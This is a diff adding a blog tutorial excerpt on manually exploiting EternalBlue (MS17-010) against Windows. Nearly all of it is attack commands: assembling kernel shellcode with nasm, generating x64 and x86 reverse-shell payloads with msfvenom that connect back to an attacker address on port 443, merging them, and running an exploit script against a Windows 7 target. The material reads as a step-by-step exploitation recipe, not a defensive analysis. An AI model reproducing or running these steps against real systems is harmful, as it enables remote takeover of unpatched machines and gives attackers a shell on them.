@@ -1,0 +1,60 @@
+Source: https://root4loot.com/post/eternalblue_manual_exploit/
+
+The first step is to assemble shellcode to binary. You can do either one (depending which architecture your target is running), or assemble both and merge them to a single binary file. The latter is useful when you don’t know the target arch or if you are planning to run it against multiple systems with different architectures.
+
+
+x64 shellcode
+Assemble kernel shellcode with nasm:
+
+$ nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+
+
+Generate a binary payload or use an existing one. Name this sc_x64_payload.bin:
+
+$ msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows -a x64 --format raw -o sc_x64_payload.bin
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Saved as: sc_x64_payload.bin
+
+Concentrate payload & shellcode:
+
+$ cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
+
+
+///////////////////////////////////////////////////////
+
+
+x86 shellcode
+Assemble kernel shellcode with nasm:
+
+$ nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+
+Generate a binary payload or use an existing one. Name this sc_x86_payload.bin:
+
+$ msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows -a x86 --format raw -o sc_x86_payload.bin
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Saved as: sc_x86_payload.bin
+
+Concentrate payload & shellcode:
+
+$ cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
+
+
+
+Merging binaries
+This step is only necessary when you want both x64 and x86 in the same binary. Assuming that you followed the steps above for each architecture; merging is done with the included eternalblue_sc_merge.py script:
+
+$ python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+
+
+Example running against vulnerable Windows 7 host:
+
+$ python eternalblue_exploit7.py 192.168.0.31 sc_all.bin
+
+
+
+
+
+
+
